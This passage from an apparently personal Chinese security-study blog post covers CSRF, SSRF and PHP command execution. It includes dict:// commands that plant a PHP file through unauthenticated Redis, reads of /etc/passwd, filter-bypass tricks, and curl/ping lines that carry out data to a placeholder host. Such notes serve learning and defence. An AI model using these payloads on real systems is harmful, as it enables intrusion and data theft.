<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.forms[<span class="number">0</span>].submit();</span></span><br><span class="line"><span class="javascript">;        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>在添加<code>input</code>标签，然后添加对应需要的值即可</p>

        <h3 id="2-利用"   >
          <a href="#2-利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-利用" class="headerlink" title="(2)利用"></a>(2)利用</h3>
      <p>通常组合拳形式来<code>XSRF</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220610155923179.png" alt="image-20220610155923179"></p>

        <h3 id="3-防御"   >
          <a href="#3-防御" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-防御" class="headerlink" title="(3)防御"></a>(3)防御</h3>
      <ul>
<li>验证<code>Referer</code>和<code>token</code></li>
<li>在<code>HTTP</code>头部加入自定义属性验证</li>
<li>高危操作加入验证码</li>
<li>等等</li>
</ul>

        <h2 id="漏洞SSRF"   >
          <a href="#漏洞SSRF" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞SSRF" class="headerlink" title="漏洞SSRF"></a>漏洞SSRF</h2>
      <p><code>SSRF</code>（<code>Server-side Request Forgery</code>）服务端请求伪造</p>
<p>比较常用的就是可以让服务器的相关敏感参数受到我们的控制，比如说我们可以传入一个<code>URL</code>让服务器去爬取，这个<code>URL</code>就是比较敏感的参数。</p>
<p>这样就可以绕过服务器的防火墙了。</p>

        <h3 id="1-可能存在的SSRF"   >
          <a href="#1-可能存在的SSRF" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-可能存在的SSRF" class="headerlink" title="(1)可能存在的SSRF"></a>(1)可能存在的SSRF</h3>
      
        <h4 id="①功能服务"   >
          <a href="#①功能服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#①功能服务" class="headerlink" title="①功能服务"></a>①功能服务</h4>
      <p>以下的就可能存在<code>SSRF</code>漏洞</p>
<ul>
<li>请求远端资源</li>
<li>在线翻译</li>
<li>数据库内置功能</li>
<li>编码服务(?api=xxxx)</li>
<li><code>URL</code>网址调用</li>
<li>邮箱邮件</li>
</ul>

        <h4 id="②关键参数"   >
          <a href="#②关键参数" class="heading-link"><i class="fas fa-link"></i></a><a href="#②关键参数" class="headerlink" title="②关键参数"></a>②关键参数</h4>
      <p><code>share、target、wap、url、sourceURL、imageURL、source、domain</code>等</p>

        <h4 id="③关键函数"   >
          <a href="#③关键函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#③关键函数" class="headerlink" title="③关键函数"></a>③关键函数</h4>
      <ul>
<li><code>PHP</code>：<ul>
<li><code>file_get_contents()</code></li>
<li><code>fsockopen()</code></li>
<li><code>curl_exec()</code></li>
<li><code>fopen()</code></li>
</ul>
</li>
<li><code>Python</code>：<ul>
<li><code>urllib</code>库<code>http</code>头注入</li>
<li><code>requests</code>库中默认跟随<code>30x</code>跳转</li>
</ul>
</li>
</ul>

        <h3 id="2-利用-1"   >
          <a href="#2-利用-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-利用-1" class="headerlink" title="(2)利用"></a>(2)利用</h3>
      
        <h4 id="①相关协议"   >
          <a href="#①相关协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#①相关协议" class="headerlink" title="①相关协议"></a>①相关协议</h4>
      <ul>
<li><p><code>file</code>：访问本地文件的协议</p>
</li>
<li><p><code>http</code></p>
</li>
<li><p><code>dict</code>：字典服务器协议，基于查询响应的<code>TCP</code>协议。查询目标服务端口，需要服务具备<code>TCP</code>回显功能</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612113058963.png" alt="image-20220612113058963"></p>
<p>常见如下：</p>
<ul>
<li><code>http:80</code></li>
<li><code>https:433</code></li>
<li><code>ftp:20/21</code></li>
<li><code>mysql:3306</code></li>
<li><code>telnet:23</code></li>
<li><code>dns:53</code></li>
<li><code>dhcp:67/68</code></li>
<li><code>sshd:22</code></li>
<li><code>nginx:80</code></li>
<li><code>tomcat:8080</code></li>
<li><code>sql server:1433</code></li>
<li><code>oracle:1521</code></li>
<li><code>smtp:25</code></li>
<li><code>redis:6379</code></li>
</ul>
</li>
<li><p><code>gopher</code>：在<code>HTTP</code>协议之前的，在<code>Internet</code>上常见的协议，支持多行，常用来攻击内网。</p>
</li>
</ul>

        <h4 id="②获取敏感文件"   >
          <a href="#②获取敏感文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#②获取敏感文件" class="headerlink" title="②获取敏感文件"></a>②获取敏感文件</h4>
      <ul>
<li><p><code>Windows</code></p>
<ul>
<li><code>C:/windows/win.ini</code>：保存系统配置文件</li>
</ul>
</li>
<li><p><code>Linux</code></p>
<ul>
<li><p><code>file:///etc/passwd</code>：获取账号密码</p>
</li>
<li><p><code>file:///etc/hosts</code>：本网段的内网IP</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612112056049.png" alt="image-20220612112056049"></p>
<p>之后可以进行内网探测</p>
</li>
</ul>
</li>
</ul>

        <h4 id="③内网横向探测-WEB"   >
          <a href="#③内网横向探测-WEB" class="heading-link"><i class="fas fa-link"></i></a><a href="#③内网横向探测-WEB" class="headerlink" title="③内网横向探测-WEB"></a>③内网横向探测-WEB</h4>
      
        <h5 id="A-首先获取内网IP"   >
          <a href="#A-首先获取内网IP" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-首先获取内网IP" class="headerlink" title="A.首先获取内网IP"></a>A.首先获取内网<code>IP</code></h5>
      <p>使用<code>file</code>协议：<code>file:///etc/hosts</code>，但是在虚拟机里不知道怎么获取到对应的<code>docker的IP</code></p>
<p>这里假设本地搭建的虚拟机里面，<code>docker</code>和本虚拟机组成的一个子网</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612113904560.png" alt="image-20220612113904560"></p>
<p>即子网中其他的<code>docker的IP</code>就是<code>172.17.0.x</code></p>

        <h5 id="B-信息收集"   >
          <a href="#B-信息收集" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-信息收集" class="headerlink" title="B.信息收集"></a>B.信息收集</h5>
      <p>爆破子网存活主机及端口</p>
<p>在<code>BurpSuite</code>中将包发到<code>Intruder</code>，然后添加<code>$</code>进行重放，由于是需要爆破多个位置，那么就使用<code>Clusterbomb</code>模式</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612120816854.png" alt="image-20220612120816854"></p>
<p>之后在<code>Payload</code>上进行设置两个位置的爆破数值</p>
<p>第一个</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612120947874.png" alt="image-20220612120947874"></p>
<p>第二个</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612121049196.png" alt="image-20220612121049196"></p>
<p>开始攻击之后得到结果，依据对应的内容和长度来判断是否存在相关的服务</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612121321908.png" alt="image-20220612121321908"></p>

        <h5 id="C-内网穿透"   >
          <a href="#C-内网穿透" class="heading-link"><i class="fas fa-link"></i></a><a href="#C-内网穿透" class="headerlink" title="C.内网穿透"></a>C.内网穿透</h5>
      <p>利用<code>gopher</code>协议来利用构造两个数据包</p>
<ul>
<li>首先将第一个爬虫数据包抓取放到<code>Repeater</code></li>
</ul>

        <h4 id="③内网横向探测-Redis-未授权"   >
          <a href="#③内网横向探测-Redis-未授权" class="heading-link"><i class="fas fa-link"></i></a><a href="#③内网横向探测-Redis-未授权" class="headerlink" title="③内网横向探测-Redis-未授权"></a>③内网横向探测-Redis-未授权</h4>
      
        <h5 id="A-dict协议测试"   >
          <a href="#A-dict协议测试" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-dict协议测试" class="headerlink" title="A.dict协议测试"></a>A.<code>dict</code>协议测试</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict://172.17.0.2:6379/</span><br></pre></td></tr></table></div></figure>

<p>返回如下<code>OK</code>即代表未授权即可访问，即没有密码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612174542324.png" alt="image-20220612174542324"></p>
<p>如果需要密码访问即如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612175006529.png" alt="image-20220612175006529"></p>

        <h5 id="B-写入木马"   >
          <a href="#B-写入木马" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-写入木马" class="headerlink" title="B.写入木马"></a>B.写入木马</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dict://172.17.0.2:6379/flushall</span><br><span class="line">dict://172.17.0.2:6379/config set dir /var/www  (网址根目录)</span><br><span class="line">dict://172.17.0.2:6379/config set dbfilename ssrf.php</span><br><span class="line">dict://172.17.0.2:6379/set webshell &quot;&lt;?php phpinfo(); ?&gt;&quot;</span><br><span class="line">dict://172.17.0.2:6379/save</span><br></pre></td></tr></table></div></figure>




        <h2 id="XXE"   >
          <a href="#XXE" class="heading-link"><i class="fas fa-link"></i></a><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2>
      
        <h2 id="命令执行"   >
          <a href="#命令执行" class="heading-link"><i class="fas fa-link"></i></a><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2>
      
        <h3 id="1-常用函数"   >
          <a href="#1-常用函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-常用函数" class="headerlink" title="(1)常用函数"></a>(1)常用函数</h3>
      
        <h4 id="①eval-函数"   >
          <a href="#①eval-函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#①eval-函数" class="headerlink" title="①eval()函数"></a>①<code>eval()</code>函数</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed eval(string $code);</span><br></pre></td></tr></table></div></figure>

<p>把字符串<code>code</code>当作<code>PHP</code>执行</p>
<ul>
<li><p>代码不能包含打开/关闭<code>PHP tags</code>，比如不能传入<code>&lt;?php echo &quot;Hi&quot;; ?&gt;</code>。但是可以利用闭合形式来关闭<code>PHP</code>再重新打开。比如</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;In PHP mode!&quot;; ?&gt; In HTML mode!&lt;?php echo &quot;Back in PHP mode!&quot;;</span><br></pre></td></tr></table></div></figure></li>
<li><p>传入的必须是有效的<code>PHP</code>代码，并且以分号<code>;</code>来进行语句分割，没有正常分割的话会导致一个<code>parse error</code>。</p>
</li>
</ul>

        <h4 id="②assert函数"   >
          <a href="#②assert函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#②assert函数" class="headerlink" title="②assert函数"></a>②<code>assert</code>函数</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool assert(mixed $assertion[,string $description])</span><br></pre></td></tr></table></div></figure>

<p><code>PHP</code>中用来判断一个表达式是否成立，返回布尔值。</p>
<p>如果<code>assertion</code>为字符串，那么它会被<code>assert()</code>当作<code>PHP</code>代码来执行。</p>

        <h4 id="③preg-replace函数"   >
          <a href="#③preg-replace函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#③preg-replace函数" class="headerlink" title="③preg_replace函数"></a>③<code>preg_replace</code>函数</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace(mixed $pattern,mixed $replacement,mixed $subject[,int $limit = -1[,int &amp;$count]])</span><br></pre></td></tr></table></div></figure>

<p>对字符串进行正则处理。搜索<code>subject</code>中匹配<code>pattern</code>的部分，以<code>replacement</code>来进行替换。当<code>$pattern</code>参数中存在<code>/e</code>修饰符时，<code>$replacement</code>的值会被当作<code>PHP</code>代码执行。</p>
<ul>
<li><code>PHP5.5.0</code>开始，传入<code>\e</code>修饰符会产生<code>E_DEPRECATED</code>错误，但是还是可以生效。而<code>PHP7.0.0</code>开始，会产生<code>E_WARNINIG</code>错误，同时<code>\e</code>无法生效</li>
</ul>
<p>如下代码，传入<code>_=phpinfo();</code>即可触发<code>phpinfo</code>函数</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo preg_replace(&#x27;/\s/e&#x27;,$_POST[_],$str);</span><br></pre></td></tr></table></div></figure>


        <h4 id="④调用函数过滤不当"   >
          <a href="#④调用函数过滤不当" class="heading-link"><i class="fas fa-link"></i></a><a href="#④调用函数过滤不当" class="headerlink" title="④调用函数过滤不当"></a>④调用函数过滤不当</h4>
      <p>通常用在框架中，小程序很少</p>
<p><code>call_user_func()、call_user_func_array()、array_map()</code>等几十个函数都可以调用其他函数的功能，其中第一个参数为调用的函数名称，如果这个函数名称可控，那么就可以调用任意函数。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed call_user_func(callable $callback[,mixed $paramenter[,mixed $....]])</span><br></pre></td></tr></table></div></figure>

<p>如下代码所示，传入<code>_assert</code>即可</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(<span class="variable">$_POST</span>[_],<span class="string">&#x27;phpinfo()&#x27;</span>);</span><br></pre></td></tr></table></div></figure>


        <h4 id="⑤动态函数执行"   >
          <a href="#⑤动态函数执行" class="heading-link"><i class="fas fa-link"></i></a><a href="#⑤动态函数执行" class="headerlink" title="⑤动态函数执行"></a>⑤动态函数执行</h4>
      <p>可拼接字符串当作函数</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a&#x27;</span>.<span class="string">&#x27;s&#x27;</span>.<span class="string">&#x27;s&#x27;</span>.<span class="string">&#x27;e&#x27;</span>.<span class="string">&#x27;r&#x27;</span>.<span class="string">&#x27;t&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="string">&#x27;phpinfo()&#x27;</span>);</span><br></pre></td></tr></table></div></figure>

<p>或者</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&#x27;a&#x27;]($_POST[_]);</span><br></pre></td></tr></table></div></figure>

<p>那么传入<code>a=assert</code>和<code>_=phpinfo();</code>即可，但是不能传递<code>eval</code>。</p>

        <h4 id="⑥可用执行命令漏洞函数"   >
          <a href="#⑥可用执行命令漏洞函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#⑥可用执行命令漏洞函数" class="headerlink" title="⑥可用执行命令漏洞函数"></a>⑥可用执行命令漏洞函数</h4>
      <ul>
<li><p><code>string system(string $command[,int &amp;$return_var])</code></p>
<p>函数执行<code>command</code>参数所指定的命令，并且输出执行结果</p>
</li>
<li><p><code>string exec(string $command[,array &amp;$output[,int &amp;$return_var]])</code></p>
<p>执行<code>command</code>指定的命令</p>
</li>
<li><p><code>string shell_exec(string $cmd)</code></p>
<p>通过<code>shell</code>环境执行命令，将完整的输出以字符串形式返回。</p>
</li>
<li><p><code>void passthru(string $command[,int &amp;$return_var])</code></p>
<p>执行外部程序并且显示原始的输出</p>
</li>
<li><p>``反引号</p>
<p>利用<code>ls</code>，会被当作系统命令执行，其实就是<code>shell_exec()</code>函数进行处理。</p>
</li>
<li><p><code>void pcntl_exec(string $path[,array $args[,array $envs]])</code></p>
<p>多进程处理扩展，需要额外进行安装才行。</p>
</li>
<li><p><code>resource popen(string $command,string $mode)</code></p>
<p>打开一个指向进程的管道，该进程由给定的<code>command</code>命令产生。</p>
</li>
<li><p><code>resource proc_open(string $cmd,array $descriptorspec,array &amp;$pipes[,string $cwd[,array $env[,array $other_options]]])</code></p>
<p>更强大一些，但是需要指定更多的参数</p>
</li>
<li><p><code>bool ob_start([callback $output_callback[,int $chunk_size[,bool $erase]]])</code></p>
<p>控制输出缓冲的，相当于另外开辟一片缓冲区，可通过<code>ob_end_flush</code>来输出缓冲区</p>
<p>可选参数<code>$output_callback</code>被指定后，<code>ob_flush/ob_clean</code>或者类似的函数进行刷新时，会调用该回调函数，并且调用时输出缓冲区的内容会被当作参数去执行，并且返回一个新的缓冲区作为结果。</p>
</li>
</ul>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> shell_exec(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line">passthru(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> `whoami`;</span><br><span class="line">pcntl_exec(<span class="string">&quot;/bin/bash&quot;</span>,<span class="keyword">array</span>(<span class="string">&#x27;whoami&#x27;</span>));</span><br><span class="line"></span><br><span class="line">popen(<span class="string">&#x27;whoami &gt;&gt; 123.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;1.txt&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="number">0</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>)),</span><br><span class="line"><span class="number">1</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>)),</span><br><span class="line"><span class="number">2</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;a&quot;</span>));</span><br><span class="line"><span class="comment">//控制标准输入输出和错误输出</span></span><br><span class="line">proc_open(<span class="string">&quot;whoami &gt;&gt; 1.txt&quot;</span>,<span class="variable">$descriptorspec</span>,<span class="variable">$pipes</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">ob_start(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$_GET</span>[a]&quot;</span>;</span><br><span class="line">ob_end_flush();<span class="comment">//会输出缓冲区内容</span></span><br><span class="line"><span class="comment">//传入为whoami即可执行命令</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="2-绕过"   >
          <a href="#2-绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-绕过" class="headerlink" title="(2)绕过"></a>(2)绕过</h3>
      <ul>
<li>命令方面</li>
</ul>
<p><code>&amp;</code>、<code>|</code>、<code>;</code>、<code>&amp;&amp;</code>、<code>||</code>之类的</p>
<ul>
<li><p>空格绕过</p>
<ul>
<li><p><code>IFS</code>，为<code>shell</code>的内置变量，用于分割字段，默认值为空(可当作空格、<code>tab</code>、换行)。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat$&#123;IFS&#125;text</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>&#123;&#125;</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;cat,text&#125;</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>tab</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat%09text</span><br></pre></td></tr></table></div></figure></li>
<li><p>重定向</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat&lt;text</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
<li><p>黑名单绕过</p>
<ul>
<li><p>拼接</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=tex;d=t;$a$b $&#123;c&#125;$&#123;d&#125;</span><br></pre></td></tr></table></div></figure></li>
<li><p>使用环境变量</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo $&#123;SHELLOPTS&#125;</span><br><span class="line">echo $&#123;SHELLOPTS:3:1&#125;</span><br><span class="line">&#123;SHELLOPTS:3:1&#125;at$&#123;IFS&#125;text</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220613112926445.png" alt="image-20220613112926445"></p>
</li>
<li><p>使用空变量</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat t&#123;x&#125;ext</span><br></pre></td></tr></table></div></figure></li>
<li><p>使用通配符</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/ca? tex?</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220613113027598.png" alt="image-20220613113027598"></p>
</li>
<li><p>使用反斜杠</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca\t tex\t</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220613113106132.png" alt="image-20220613113106132"></p>
</li>
<li><p><code>base64</code>编码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo t|base64</span><br><span class="line">ca$(echo &quot;dAo=&quot;|base -d) text</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220613113225371.png" alt="image-20220613113225371"></p>
</li>
</ul>
</li>
<li><p>无回显绕过</p>
<ul>
<li><p>使用<code>HTTP</code>通道带出数据</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl host/`whoami`</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220613114812865.png" alt="image-20220613114812865"></p>
</li>
<li><p>使用<code>DNS</code>通道带出数据</p>
<p>一样的</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping `whoami`.host</span><br></pre></td></tr></table></div></figure></li>
<li><p>编码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl hosts/$(whoami|base64)</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
</ul>

        <h3 id="3-防御-1"   >
          <a href="#3-防御-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-防御-1" class="headerlink" title="(3)防御"></a>(3)防御</h3>
      <p>正则表达式白名单、过滤</p>

        <h2 id="漏洞JAVA反序列化"   >
          <a href="#漏洞JAVA反序列化" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞JAVA反序列化" class="headerlink" title="漏洞JAVA反序列化"></a>漏洞JAVA反序列化</h2>
      <p>从数据对象反序列化成内存对象的过程，主要是各种链子，有点困难，需要后续慢慢研究。</p>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://PIG-007.github.io">PIG-007</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://pig-007.github.io/2022/06/19/%E5%AE%9E%E8%AE%AD/">http://pig-007.github.io/2022/06/19/%E5%AE%9E%E8%AE%AD/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://pig-007.github.io/tags/WEB/">WEB</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2022/07/25/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">JAVA反序列化CC链笔记</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2022/04/15/CVE-2021-22555_Netfilter%E5%A0%86%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/"><span class="paginator-prev__text">CVE-2021-22555</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">
          前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%AB%99URL"><span class="toc-text">
          网站URL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AEHTTP"><span class="toc-text">
          协议HTTP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%AF%B7%E6%B1%82%E6%8A%A5%E6%96%87"><span class="toc-text">
          (1)请求报文</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E7%BB%93%E6%9E%84"><span class="toc-text">
          ①结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95"><span class="toc-text">
          ②请求方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%93%8D%E5%BA%94%E6%8A%A5%E6%96%87"><span class="toc-text">
          (2)响应报文</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E7%BB%93%E6%9E%84-1"><span class="toc-text">
          ①结构</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AEHTTPS"><span class="toc-text">
          协议HTTPS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%9A%E8%AF%9D"><span class="toc-text">
          会话</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EWebshell"><span class="toc-text">
          关于Webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81"><span class="toc-text">
          身份认证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%B8%B8%E8%A7%81%E8%AE%A4%E8%AF%81"><span class="toc-text">
          (1)常见认证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Basic%E8%AE%A4%E8%AF%81"><span class="toc-text">
          (2)Basic认证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">
          文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E"><span class="toc-text">
          (1)验证漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-text">
